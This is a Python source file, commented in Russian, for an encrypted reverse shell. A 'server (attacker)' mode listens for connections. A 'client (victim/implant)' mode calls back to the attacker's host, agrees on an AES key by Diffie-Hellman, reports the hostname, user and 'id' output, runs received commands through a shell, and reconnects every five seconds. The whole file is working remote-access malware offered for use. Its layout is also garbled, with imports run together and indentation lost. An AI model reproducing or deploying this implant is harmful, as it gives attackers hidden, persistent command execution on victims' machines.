#!/usr/bin/env python3
importimportimportimportimportimportimportsocket
subprocess
os
sys
json
hashlib
argparse
importimportthreading
base64
try:
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
except ImportError:
print("[!] pip install pycryptodome")
sys.exit(1)
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ── Diffie-Hellman параметры (RFC 3526 Group 14)
─────────────────────────────
DH_P = int(
"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74"
"020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F1437
"
"4FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF05"
"98DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB
"
"9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
"E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF695581718"
"3995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF",
16
)
DH_G = 2
def dh_generate_keypair() -> tuple[int, int]:
"""Генерируем DH ключевую пару (private, public)."""
private_key = int.from_bytes(get_random_bytes(32), "big") % DH_P
public_key = pow(DH_G, private_key, DH_P)
return (private_key, public_key)
def dh_compute_shared(their_public: int, our_private: int) -> bytes:
"""Вычисляем общий секрет."""
shared = pow(their_public, our_private, DH_P)
# Хэшируем для получения 32-байтового AES ключа
return hashlib.sha256(shared.to_bytes(256, "big")).digest()
def aes_encrypt(key: bytes, plaintext: str) -> str:
"""Шифрует строку AES-256-CBC. Возвращает base64 строку."""
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(plaintext.encode("utf-8", errors="replace"),
AES.block_size))
return base64.b64encode(iv + ct).decode()
def aes_decrypt(key: bytes, ciphertext: str) -> str:
"""Расшифровывает base64 строку AES-256-CBC. Возвращает plaintext."""
raw = base64.b64decode(ciphertext)
iv = raw[:16]
ct = raw[16:]
cipher = AES.new(key, AES.MODE_CBC, iv)
return unpad(cipher.decrypt(ct), AES.block_size).decode("utf-8",
errors="replace")
def send_msg(sock: socket.socket, data: str) -> None:
"""Отправляем сообщение с length prefix."""
encoded = data.encode("utf-8")
length = len(encoded).to_bytes(4, "big")
sock.sendall(length + encoded)
def recv_msg(sock: socket.socket) -> str:
length_bytes = b""
while len(length_bytes) < 4:
chunk = sock.recv(4 - len(length_bytes))
if not chunk:
raise ConnectionError("Connection closed")
length_bytes += chunk
length = int.from_bytes(length_bytes, "big")
data = b""
while len(data) < length:
chunk = sock.recv(min(4096, length - len(data)))
if not chunk:
raise ConnectionError("Connection closed")
data += chunk
return data.decode("utf-8")
def dh_exchange(sock: socket.socket, is_server: bool) -> bytes:
"""Выполняем DH ключевой обмен. Возвращает общий AES ключ."""
private_key, public_key = dh_generate_keypair()
pub_bytes = str(public_key)
if is_server:
# Сервер: сначала получаем, потом отправляем
their_pub_str = recv_msg(sock)
send_msg(sock, pub_bytes)
else:
# Клиент: сначала отправляем, потом получаем
send_msg(sock, pub_bytes)
their_pub_str = recv_msg(sock)
their_public = int(their_pub_str)
shared_key = dh_compute_shared(their_public, private_key)
return shared_key
def run_server(port: int) -> None:
"""Сервер (атакующий) — слушает входящие соединения."""
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", port))
server.listen(1)
print(f"{CYAN}[*] Слушаем на порту {port}...{RESET}")
print(f"{YELLOW}[!] Ожидаем reverse shell...{RESET}")
conn, addr = server.accept()
print(f"\n{GREEN}[+] Подключение от {addr[0]}:{addr[1]}{RESET}")
# DH ключевой обмен
print(f"{CYAN}[*] DH ключевой обмен...{RESET}")
aes_key = dh_exchange(conn, is_server=True)
print(f"{GREEN}[+] AES ключ согласован: {aes_key[:8].hex()}...{RESET}")
print(f"{GREEN}[+] Все команды зашифрованы AES-256-CBC{RESET}")
print(f"{YELLOW}[!] Введи 'exit' для выхода{RESET}")
print("-" * 50)
# Получаем информацию о системе
try:
sysinfo = aes_decrypt(aes_key, recv_msg(conn))
print(f"{GREEN}{sysinfo}{RESET}")
except Exception:
pass
# Интерактивный шелл
while True:
try:
cmd = input(f"\n{CYAN}shell>{RESET} ")
if not cmd.strip():
continue
if cmd.strip().lower() == "exit":
send_msg(conn, aes_encrypt(aes_key, "EXIT"))
break
encrypted_cmd = aes_encrypt(aes_key, cmd)
send_msg(conn, encrypted_cmd)
response_enc = recv_msg(conn)
response = aes_decrypt(aes_key, response_enc)
print(response, end="")
except (ConnectionError, KeyboardInterrupt):
print(f"\n{RED}[!] Соединение потеряно{RESET}")
break
conn.close()
server.close()
def run_client(host: str, port: int) -> None:
"""Клиент (жертва/имплант) — подключается к серверу."""
while True:
try:
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
# DH ключевой обмен
aes_key = dh_exchange(sock, is_server=False)
# Отправляем системную информацию
sysinfo = f"[+] Соединение установлено\n"
sysinfo += f" Hostname: {os.uname().nodename}\n" if hasattr(os, 'uname')
else ""
sysinfo += f" User: {os.getenv('USER', 'unknown')}\n"
sysinfo += f" CWD: {os.getcwd()}\n"
try:
whoami = subprocess.check_output(["id"], text=True).strip()
sysinfo += f" ID: {whoami}\n"
except Exception:
pass
send_msg(sock, aes_encrypt(aes_key, sysinfo))
# Цикл выполнения команд
while True:
enc_cmd = recv_msg(sock)
cmd = aes_decrypt(aes_key, enc_cmd)
if cmd.strip() == "EXIT":
break
# Выполняем команду
try:
if cmd.startswith("cd "):
path = cmd[3:].strip()
os.chdir(path)
result = f"[cd] {os.getcwd()}\n"
else:
proc = subprocess.run(
cmd, shell=True,
capture_output=True, text=True,
timeout=30
)
result = proc.stdout + proc.stderr
if not result:
result = "[no output]\n"
except subprocess.TimeoutExpired:
result = "[!] Команда превысила таймаут 30s\n"
except Exception as e:
result = f"[!] Ошибка: {e}\n"
send_msg(sock, aes_encrypt(aes_key, result))
sock.close()
except Exception:
import time
time.sleep(5) # Переподключение каждые 5 сек
continue
def main():
parser = argparse.ArgumentParser(description="Encrypted Reverse Shell
(AES-256-CBC)")
parser.add_argument("--mode", required=True, choices=["server", "client"],
help="Режим: server (атакующий) или client (жертва)")
parser.add_argument("--host", default=None, help="IP сервера (для client)")
parser.add_argument("--port", type=int, default=4444, help="Порт")
args = parser.parse_args()
if args.mode == "server":
run_server(args.port)
else:
if not args.host:
print(f"{RED}[!] Нужен --host для режима client{RESET}")
sys.exit(1)
run_client(args.host, args.port)
if __name__ == "__main__":
main()
